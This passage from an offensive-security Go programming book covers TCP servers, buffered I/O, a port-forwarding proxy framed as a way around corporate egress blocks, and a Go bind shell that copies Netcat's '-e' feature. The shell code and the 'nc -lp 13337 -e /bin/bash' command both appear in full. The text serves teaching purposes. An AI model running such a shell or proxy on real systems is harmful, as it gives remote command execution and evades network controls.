<p class="indent">Notice that the explicit calls to <code>reader.Read([]byte)</code> and <code>writer.Write([]byte)</code> have been replaced with a single call to <code>io.Copy(writer, reader)</code> <span class="ent">❶</span>. Under the covers, <code>io.Copy(writer, reader)</code> calls the <code>Read([]byte)</code> function on the provided reader, triggering the <code>FooReader</code> to read from stdin. Subsequently, <code>io.Copy(writer, reader)</code> calls the <code>Write([]byte)</code> function on the provided writer, resulting in a call to your <code>FooWriter</code>, which writes the data to stdout. Essentially, <code>io.Copy(writer, reader)</code> handles the sequential read-then-write process without all the petty details.</p>&#13;
<p class="indent">This introductory section is by no means a comprehensive look at Go’s I/O and interfaces. Many convenience functions and custom readers and writers exist as part of the standard Go packages. In most cases, Go’s standard packages contain all the basic implementations to achieve the most common tasks. In the next section, let’s explore how to apply these fundamentals to TCP communications, eventually using the power vested in you to develop real-life, usable tools.</p>&#13;
<h4 class="h4" id="ch2lev2sec5">Creating the Echo Server</h4>&#13;
<p class="noindent">As is customary for most languages, you’ll start by building an echo server to learn how to read and write data to and from a socket. To do this, you’ll use <code>net.Conn</code>, Go’s stream-oriented network connection, which we introduced when you built a port scanner. Based on Go’s documentation for the data type, <code>Conn</code> implements the <code>Read([]byte)</code> and <code>Write([]byte)</code> functions as defined for the <code>Reader</code> and <code>Writer</code> interfaces. Therefore, <code>Conn</code> is both a <code>Reader</code> and a <code>Writer</code> (yes, this is possible). This makes sense logically, as TCP connections are bidirectional and can be used to send (write) or receive (read) data.</p>&#13;
<p class="indent">After creating an instance of <code>Conn</code>, you’ll be able to send and receive data over a TCP socket. However, a TCP server can’t simply manufacture a connection; a client must establish a connection. In Go, you can use <code>net.Listen</code><code>(</code><span class="codeitalic">network</span><code>,</code> <span class="codeitalic">address string</span><code>)</code> to first open a TCP listener on a specific port. Once a client connects, the <code>Accept()</code> method creates and returns a <code>Conn</code> object that you can use for receiving and sending data.</p>&#13;
<p class="indent"><a href="ch02.xhtml#ch2list11">Listing 2-11</a> shows a complete example of a server implementation. We’ve included comments inline for clarity. Don’t worry about understanding the code in its entirety, as we’ll break it down momentarily.</p>&#13;
<pre>package main&#13;
&#13;
import (&#13;
    "log"&#13;
    "net"&#13;
)&#13;
&#13;
<span epub:type="pagebreak" id="page_36"/>// echo is a handler function that simply echoes received data.&#13;
func echo(conn net.Conn) {&#13;
    defer conn.Close()&#13;
&#13;
    // Create a buffer to store received data.&#13;
    b := make([]byte, 512)&#13;
 <span class="ent">❶</span> for {&#13;
        // Receive data via conn.Read into a buffer.&#13;
        size, err := conn.Read<span class="ent">❷</span>(b[0:])&#13;
        if err == io.EOF {&#13;
            log.Println("Client disconnected")&#13;
            break&#13;
        }&#13;
        if err != nil {&#13;
            log.Println("Unexpected error")&#13;
            break&#13;
        }&#13;
        log.Printf("Received %d bytes: %s\n", size, string(b))&#13;
&#13;
        // Send data via conn.Write.&#13;
        log.Println("Writing data")&#13;
        if _, err := conn.Write<span class="ent">❸</span>(b[0:size]); err != nil {&#13;
            log.Fatalln("Unable to write data")&#13;
        }&#13;
    }&#13;
}&#13;
&#13;
func main() {&#13;
    // Bind to TCP port 20080 on all interfaces.&#13;
 <span class="ent">❹</span> listener, err := net.Listen("tcp", ":20080")&#13;
    if err != nil {&#13;
        log.Fatalln("Unable to bind to port")&#13;
    }&#13;
    log.Println("Listening on 0.0.0.0:20080")&#13;
 <span class="ent">❺</span> for {&#13;
        // Wait for connection. Create net.Conn on connection established.&#13;
     <span class="ent">❻</span> conn, err := listener.Accept()&#13;
        log.Println("Received connection")&#13;
        if err != nil {&#13;
            log.Fatalln("Unable to accept connection")&#13;
        }&#13;
        // Handle the connection. Using goroutine for concurrency.&#13;
     <span class="ent">❼</span> go echo(conn)&#13;
    }&#13;
}</pre>&#13;
<p class="caption" id="ch2list11"><em>Listing 2-11: A basic echo server (</em><a href="https://gihub.com/blackhat-go/bhg/blob/master/ch-2/echo-server/main.go">/ch-2/echo-server/main.go</a><em>)</em></p>&#13;
<p class="indent"><a href="ch02.xhtml#ch2list11">Listing 2-11</a> begins by defining a function named <code>echo(net.Conn)</code>, which accepts a <code>Conn</code> instance as a parameter. It behaves as a connection handler to perform all necessary I/O. The function loops indefinitely <span class="ent">❶</span>, using a buffer to read <span class="ent">❷</span> and write <span class="ent">❸</span> data from and to the connection. The data is read into a variable named <code>b</code> and subsequently written back on the connection.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_37"/>Now you need to set up a listener that will call your handler. As mentioned previously, a server can’t manufacture a connection but must instead listen for a client to connect. Therefore, a listener, defined as <code>tcp</code> bound to port 20080, is started on all interfaces by using the <code>net.Listen(</code><span class="codeitalic">network</span><code>,</code> <span class="codeitalic">address string</span><code>)</code> function <span class="ent">❹</span>.</p>&#13;
<p class="indent">Next, an infinite loop <span class="ent">❺</span> ensures that the server will continue to listen for connections even after one has been received. Within this loop, you call <code>listener.Accept()</code> <span class="ent">❻</span>, a function that blocks execution as it awaits client connections. When a client connects, this function returns a <code>Conn</code> instance. Recall from earlier discussions in this section that <code>Conn</code> is both a <code>Reader</code> and a <code>Writer</code> (it implements the <code>Read([]byte)</code> and <code>Write([]byte)</code> interface methods).</p>&#13;
<p class="indent">The <code>Conn</code> instance is then passed to the <code>echo(net.Conn)</code> handler function <span class="ent">❼</span>. This call is prefaced with the <code>go</code> keyword, making it a concurrent call so that other connections don’t block while waiting for the handler function to complete. This is likely overkill for such a simple server, but we’ve included it again to demonstrate the simplicity of Go’s concurrency pattern, in case it wasn’t already clear. At this point, you have two lightweight threads running concurrently:</p>&#13;
<ul>&#13;
<li><p class="noindentt">The main thread loops back and blocks on <code>listener.Accept()</code> while it awaits another connection.</p></li>&#13;
<li><p class="noindentt">The handler goroutine, whose execution has been transferred to the <code>echo(net.Conn)</code> function, proceeds to run, processing the data.</p></li>&#13;
</ul>&#13;
<p class="indent">The following shows an example using Telnet as the connecting client:</p>&#13;
<pre>$ <span class="codestrong1">telnet localhost 20080</span>&#13;
Trying 127.0.0.1...&#13;
Connected to localhost.&#13;
Escape character is '^]'.&#13;
test of the echo server&#13;
test of the echo server</pre>&#13;
<p class="indent">The server produces the following standard output:</p>&#13;
<pre>$ <span class="codestrong1">go run main.go</span>&#13;
2020/01/01 06:22:09 Listening on 0.0.0.0:20080&#13;
2020/01/01 06:22:14 Received connection&#13;
2020/01/01 06:22:18 Received 25 bytes: test of the echo server&#13;
2020/01/01 06:22:18 Writing data</pre>&#13;
<p class="indent">Revolutionary, right? A server that repeats back to the client exactly what the client sent to the server. What a useful and exciting example! It’s quite a time to be alive.</p>&#13;
<h4 class="h4" id="ch2lev2sec6">Improving the Code by Creating a Buffered Listener</h4>&#13;
<p class="noindent">The example in <a href="ch02.xhtml#ch2list11">Listing 2-11</a> works perfectly fine but relies on fairly low-level function calls, buffer tracking, and iterative reads/writes. This is a somewhat tedious, error-prone process. Fortunately, Go contains other packages <span epub:type="pagebreak" id="page_38"/>that can simplify this process and reduce the complexity of the code. Specifically, the <code>bufio</code> package wraps <code>Reader</code> and <code>Writer</code> to create a buffered I/O mechanism. The updated <code>echo(net.Conn)</code> function is detailed here, and an explanation of the changes follows:</p>&#13;
<pre>func echo(conn net.Conn) {&#13;
    defer conn.Close()&#13;
&#13;
 <span class="ent">❶</span> reader := bufio.NewReader(conn)&#13;
    s, err := reader.ReadString('\n')<span class="ent">❷</span>&#13;
    if err != nil {&#13;
        log.Fatalln("Unable to read data")&#13;
    }&#13;
    log.Printf("Read %d bytes: %s", len(s), s)&#13;
&#13;
    log.Println("Writing data")&#13;
 <span class="ent">❸</span> writer := bufio.NewWriter(conn)&#13;
    if _, err := writer.WriteString(s)<span class="ent">❹</span>; err != nil {&#13;
        log.Fatalln("Unable to write data")&#13;
    }&#13;
 <span class="ent">❺</span> writer.Flush()&#13;
}</pre>&#13;
<p class="indent">No longer are you directly calling the <code>Read([]byte)</code> and <code>Write([]byte)</code> functions on the <code>Conn</code> instance; instead, you’re initializing a new buffered <code>Reader</code> and <code>Writer</code> via <code>NewReader(</code><span class="codeitalic">io.Reader</span><code>)</code> <span class="ent">❶</span> and <code>NewWriter(</code><span class="codeitalic">io.Writer</span><code>)</code> <span class="ent">❸</span>. These calls both take, as a parameter, an existing <code>Reader</code> and <code>Writer</code> (remember, the <code>Conn</code> type implements the necessary functions to be considered both a <code>Reader</code> and a <code>Writer</code>).</p>&#13;
<p class="indent">Both buffered instances contain complementary functions for reading and writing string data. <code>ReadString(</code><span class="codeitalic">byte</span><code>)</code> <span class="ent">❷</span> takes a delimiter character used to denote how far to read, whereas <code>WriteString(</code><span class="codeitalic">byte</span><code>)</code> <span class="ent">❹</span> writes the string to the socket. When writing data, you need to explicitly call <code>writer.Flush()</code> <span class="ent">❺</span> to flush write all the data to the underlying writer (in this case, a <code>Conn</code> instance).</p>&#13;
<p class="indent">Although the previous example simplifies the process by using buffered I/O, you can reframe it to use the <code>Copy(Writer, Reader)</code> convenience function. Recall that this function takes as input a destination <code>Writer</code> and a source <code>Reader</code>, simply copying from source to destination.</p>&#13;
<p class="indent">In this example, you’ll pass the <code>conn</code> variable as both the source and destination because you’ll be echoing the contents back on the established connection:</p>&#13;
<pre>func echo(conn net.Conn) {&#13;
    defer conn.Close()&#13;
    // Copy data from io.Reader to io.Writer via io.Copy().&#13;
    if _, err := io.Copy(conn, conn); err != nil {&#13;
        log.Fatalln("Unable to read/write data")&#13;
    }&#13;
}</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_39"/>You’ve explored the basics of I/O and applied it to TCP servers. Now it’s time to move on to more usable, relevant examples.</p>&#13;
<h4 class="h4" id="ch2lev2sec7">Proxying a TCP Client</h4>&#13;
<p class="noindent">Now that you have a solid foundation, you can take what you’ve learned up to this point and create a simple port forwarder to proxy a connection through an intermediary service or host. As mentioned earlier in this chapter, this is useful for trying to circumvent restrictive egress controls or to leverage a system to bypass network segmentation.</p>&#13;
<p class="indent">Before laying out the code, consider this imaginary but realistic problem: Joe is an underperforming employee who works for ACME Inc. as a business analyst making a handsome salary based on slight exaggerations he included on his resume. (Did he really go to an Ivy League school? Joe, that’s not very ethical.) Joe’s lack of motivation is matched only by his love for cats—so much so that Joe installed cat cameras at home and hosted a site, <em>joescatcam.website</em>, through which he could remotely monitor the dander-filled fluff bags. One problem, though: ACME is onto Joe. They don’t like that he’s streaming his cat cam 24/7 in 4K ultra high-def, using valuable ACME network bandwidth. ACME has even blocked its employees from visiting Joe’s cat cam website.</p>&#13;
<p class="indent">Joe has an idea. “What if I set up a port-forwarder on an internet-based system I control,” Joe says, “and force the redirection of all traffic from that host to <em>joescatcam.website</em>?” Joe checks at work the following day and confirms he can access his personal website, hosted at the <em>joesproxy.com</em> domain. Joe skips his afternoon meetings, heads to a coffee shop, and quickly codes a solution to his problem. He’ll forward all traffic received at <em>http://joesproxy.com</em> to <em>http://joescatcam.website</em>.</p>&#13;
<p class="indent">Here’s Joe’s code, which he runs on the <em>joesproxy.com</em> server:</p>&#13;
<pre>func handle(src net.Conn) {&#13;
    dst, err := net.Dial("tcp", "joescatcam.website:80")<span class="ent">❶</span>&#13;
    if err != nil {&#13;
        log.Fatalln("Unable to connect to our unreachable host")&#13;
    }&#13;
    defer dst.Close()&#13;
&#13;
    // Run in goroutine to prevent io.Copy from blocking&#13;
 <span class="ent">❷</span> go func() {&#13;
        // Copy our source's output to the destination&#13;
        if _, err := io.Copy(dst, src)<span class="ent">❸</span>; err != nil {&#13;
            log.Fatalln(err)&#13;
        }&#13;
    }()&#13;
    // Copy our destination's output back to our source&#13;
    if _, err := io.Copy(src, dst)<span class="ent">❹</span>; err != nil {&#13;
        log.Fatalln(err)&#13;
    }&#13;
}&#13;
<span epub:type="pagebreak" id="page_40"/>func main() {&#13;
    // Listen on local port 80&#13;
    listener, err := net.Listen("tcp", ":80")&#13;
    if err != nil {&#13;
        log.Fatalln("Unable to bind to port")&#13;
    }&#13;
&#13;
    for {&#13;
        conn, err := listener.Accept()&#13;
        if err != nil {&#13;
            log.Fatalln("Unable to accept connection")&#13;
        }&#13;
        go handle(conn)&#13;
    }&#13;
}</pre>&#13;
<p class="indent">Start by examining Joe’s <code>handle(net.Conn)</code> function. Joe connects to <em>joescatcam.website</em> <span class="ent">❶</span> (recall that this unreachable host isn’t directly accessible from Joe’s corporate workstation). Joe then uses <code>Copy(Writer, Reader)</code> two separate times. The first instance <span class="ent">❸</span> ensures that data from the inbound connection is copied to the <em>joescatcam.website</em> connection. The second instance <span class="ent">❹</span> ensures that data read from <em>joescatcam.website</em> is written back to the connecting client’s connection. Because <code>Copy(Writer, Reader)</code> is a blocking function, and will continue to block execution until the network connection is closed, Joe wisely wraps his first call to <code>Copy(Writer, Reader)</code> in a new goroutine <span class="ent">❷</span>. This ensures that execution within the <code>handle(net.Conn)</code> function continues, and the second <code>Copy(Writer, Reader)</code> call can be made.</p>&#13;
<p class="indent">Joe’s proxy listens on port 80 and relays any traffic received from a connection to and from port 80 on <em>joescatcam.website.</em> Joe, that crazy and wasteful man, confirms that he can connect to <em>joescatcam.website</em> via <em>joesproxy.com</em> by connecting with <code>curl</code>:</p>&#13;
<pre>$ <span class="codestrong1">curl -i -X GET http://joesproxy.com</span>&#13;
HTTP/1.1 200 OK&#13;
Date: Wed, 25 Nov 2020 19:51:54 GMT&#13;
Server: Apache/2.4.18 (Ubuntu)&#13;
Last-Modified: Thu, 27 Jun 2019 15:30:43 GMT&#13;
ETag: "6d-519594e7f2d25"&#13;
Accept-Ranges: bytes&#13;
Content-Length: 109&#13;
Vary: Accept-Encoding&#13;
Content-Type: text/html&#13;
<span class="codeitalic1">--snip--</span></pre>&#13;
<p class="indent">At this point, Joe has done it. He’s living the dream, wasting ACME-sponsored time and network bandwidth while he watches his cats. Today, there will be cats!</p>&#13;
<h4 class="h4" id="ch2lev2sec8">Replicating Netcat for Command Execution</h4>&#13;
<p class="noindent">In this section, let’s replicate some of Netcat’s more interesting functionality—specifically, its gaping security hole.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_41"/><em>Netcat</em> is the TCP/IP Swiss Army knife—essentially, a more flexible, scriptable version of Telnet. It contains a feature that allows stdin and stdout of any arbitrary program to be redirected over TCP, enabling an attacker to, for example, turn a single command execution vulnerability into operating system shell access. Consider the following:</p>&#13;
<pre>$ <span class="codestrong1">nc –lp 13337 –e /bin/bash</span></pre>&#13;
<p class="indent">This command creates a listening server on port 13337. Any remote client that connects, perhaps via Telnet, would be able to execute arbitrary bash commands—hence the reason this is referred to as a <em>gaping security hole</em>. Netcat allows you to optionally include this feature during program compilation. (For good reason, most Netcat binaries you’ll find on standard Linux builds do <em>not</em> include this feature.) It’s dangerous enough that we’ll show you how to create it in Go!</p>&#13;
<p class="indent">First, look at Go’s <code>os/exec</code> package. You’ll use that for running operating system commands. This package defines a type, <code>Cmd</code>, that contains necessary methods and properties to run commands and manipulate stdin and stdout. You’ll redirect stdin (a <code>Reader</code>) and stdout (a <code>Writer</code>) to a <code>Conn</code> instance (which is both a <code>Reader</code> and a <code>Writer</code>).</p>&#13;
<p class="indent">When you receive a new connection, you can use the <code>Command(</code><span class="codeitalic">name</span><span class="literal"/> <span class="codeitalic">string</span><code>,</code> <span class="codeitalic">arg ...string</span><code>)</code> function from <code>os/exec</code> to create a new <code>Cmd</code> instance. This function takes as parameters the operating system command and any arguments. In this example, hardcode <code>/bin/sh</code> as the command and pass <code>-i</code> as an argument such that you’re in interactive mode, which allows you to manipulate stdin and stdout more reliably:</p>&#13;
<pre>cmd := exec.Command("/bin/sh", "-i")</pre>&#13;
<p class="indent">This creates an instance of <code>Cmd</code> but doesn’t yet execute the command. You have a couple of options for manipulating stdin and stdout. You could use <code>Copy(Writer, Reader)</code> as discussed previously, or directly assign <code>Reader</code> and <code>Writer</code> to <code>Cmd</code>. Let’s directly assign your <code>Conn</code> object to both <code>cmd.Stdin</code> and <code>cmd.Stdout</code>, like so:</p>&#13;
<pre>cmd.Stdin = conn&#13;
cmd.Stdout = conn</pre>&#13;
<p class="indent">With the setup of the command and the streams complete, you run the command by using <code>cmd.Run()</code>:</p>&#13;
<pre>if err := cmd.Run(); err != nil {&#13;
    // Handle error.&#13;
}</pre>&#13;
<p class="indent">This logic works perfectly fine on Linux systems. However, when tweaking and running the program on a Windows system, running <code>cmd.exe</code> instead of <code>/bin/bash</code>, you’ll find that the connecting client never receives the <span epub:type="pagebreak" id="page_42"/>command output because of some Windows-specific handling of anonymous pipes. Here are two solutions for this problem.</p>&#13;
<p class="indent">First, you can tweak the code to explicitly force the flushing of stdout to correct this nuance. Instead of assigning <code>Conn</code> directly to <code>cmd.Stdout</code>, you implement a custom <code>Writer</code> that wraps <code>bufio.Writer</code> (a buffered writer) and explicitly calls its <code>Flush</code> method to force the buffer to be flushed. Refer to the “Creating the Echo Server” on <a href="ch02.xhtml#page_35">page 35</a> for an exemplary use of <code>bufio.Writer</code>.</p>&#13;
<p class="indent">Here’s the definition of the custom writer, <code>Flusher</code>:</p>&#13;
<pre>   // Flusher wraps bufio.Writer, explicitly flushing on all writes.&#13;
   type Flusher struct {&#13;
       w *bufio.Writer&#13;
   }&#13;
&#13;
   // NewFlusher creates a new Flusher from an io.Writer.&#13;
   func NewFlusher(w io.Writer) *Flusher {&#13;
       return &amp;Flusher{&#13;
           w: bufio.NewWriter(w),&#13;
       }&#13;
   }&#13;
&#13;
   // Write writes bytes and explicitly flushes buffer.&#13;
<span class="ent">❶</span> func (foo *Flusher) Write(b []byte) (int, error) {&#13;
       count, err := foo.w.Write(b)<span class="ent">❷</span>&#13;
       if err != nil {&#13;
           return -1, err&#13;
       }&#13;
       if err := foo.w.Flush()<span class="ent">❸</span>; err != nil {&#13;
           return -1, err&#13;
       }&#13;
       return count, err&#13;
   }</pre>&#13;
<p class="indent">The <code>Flusher</code> type implements a <code>Write([]byte)</code> function <span class="ent">❶</span> that writes <span class="ent">❷</span> the data to the underlying buffered writer and then flushes <span class="ent">❸</span> the output.</p>&#13;
<p class="indent">With the implementation of a custom writer, you can tweak the connection handler to instantiate and use this <code>Flusher</code> custom type for <code>cmd.Stdout</code>:</p>&#13;
<pre>func handle(conn net.Conn) {&#13;
    // Explicitly calling /bin/sh and using -i for interactive mode&#13;
    // so that we can use it for stdin and stdout.&#13;
    // For Windows use exec.Command("cmd.exe").&#13;
    cmd := exec.Command("/bin/sh", "-i")&#13;
&#13;
    // Set stdin to our connection&#13;
    cmd.Stdin = conn&#13;
&#13;
    // Create a Flusher from the connection to use for stdout.&#13;
    // This ensures stdout is flushed adequately and sent via net.Conn.&#13;
    cmd.Stdout = NewFlusher(conn)&#13;
&#13;
    // Run the command.&#13;
    if err := cmd.Run(); err != nil {&#13;
<span epub:type="pagebreak" id="page_43"/>        log.Fatalln(err)&#13;
    }&#13;
}</pre>&#13;
<p class="indent">This solution, while adequate, certainly isn’t elegant. Although working code is more important than elegant code, we’ll use this problem as an opportunity to introduce the <code>io.Pipe()</code> function, Go’s synchronous, in-memory pipe that can be used for connecting <code>Readers</code> and <code>Writers</code>:</p>&#13;
<pre>func Pipe() (*PipeReader, *PipeWriter)</pre>&#13;
<p class="indent">Using <code>PipeReader</code> and <code>PipeWriter</code> allows you to avoid having to explicitly flush the writer and synchronously connect stdout and the TCP connection. You will, yet again, rewrite the handler function:</p>&#13;
<pre>func handle(conn net.Conn) {&#13;
    // Explicitly calling /bin/sh and using -i for interactive mode&#13;
    // so that we can use it for stdin and stdout.&#13;
    // For Windows use exec.Command("cmd.exe").&#13;
    cmd := exec.Command("/bin/sh", "-i")&#13;
    // Set stdin to our connection&#13;
    rp, wp := io.Pipe()<span class="ent">❶</span>&#13;
    cmd.Stdin = conn&#13;
 <span class="ent">❷</span> cmd.Stdout = wp&#13;
 <span class="ent">❸</span> go io.Copy(conn, rp)&#13;
    cmd.Run()&#13;
    conn.Close()&#13;
}</pre>&#13;
<p class="indent">The call to <code>io.Pipe()</code> <span class="ent">❶</span> creates both a reader and a writer that are synchronously connected—any data written to the writer (<code>wp</code> in this example) will be read by the reader (<code>rp</code>). So, you assign the writer to <code>cmd.Stdout</code> <span class="ent">❷</span> and then use <code>io.Copy(conn, rp)</code> <span class="ent">❸</span> to link the <code>PipeReader</code> to the TCP connection. You do this by using a goroutine to prevent the code from blocking. Any standard output from the command gets sent to the writer and then subsequently piped to the reader and out over the TCP connection. How’s that for elegant?</p>&#13;
<p class="indent">With that, you’ve successfully implemented Netcat’s gaping security hole from the perspective of a TCP listener awaiting a connection. You can use similar logic to implement the feature from the perspective of a connecting client redirecting stdout and stdin of a local binary to a remote listener. The precise details are left to you to determine, but would likely include the following:</p>&#13;
<ul>&#13;
<li><p class="noindentt">Establish a connection to a remote listener via <code>net.Dial(</code><span class="codeitalic">network</span><code>,</code> <span class="codeitalic">address string</span><code>)</code>.</p></li>&#13;
<li><p class="noindentt">Initialize a <code>Cmd</code> via <code>exec.Command(</code><span class="codeitalic">name string</span><code>,</code> <span class="codeitalic">arg ...string</span><code>)</code>.</p></li>&#13;
<li><p class="noindentt">Redirect <code>Stdin</code> and <code>Stdout</code> properties to utilize the <code>net.Conn</code> object.</p></li>&#13;
<li><p class="noindentt">Run the command.</p></li>&#13;
</ul>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_44"/>At this point, the listener should receive a connection. Any data sent to the client should be interpreted as stdin on the client, and any data received on the listener should be interpreted as stdout. The full code of this example is available at <a href="https://github.com/blackhat-go/bhg/blob/master/ch-2/netcat-exec/main.go"><em>https://github.com/blackhat-go/bhg/blob/master/ch-2/netcat-exec/</em></a><em>main.go</em>.</p>&#13;
<h3 class="h3" id="ch2lev1sec5">Summary</h3>&#13;
<p class="noindent">Now that you’ve explored practical applications and usage of Go as it relates to networking, I/O, and concurrency, let’s move on to creating usable HTTP clients.</p>&#13;
</div>



  </body></html>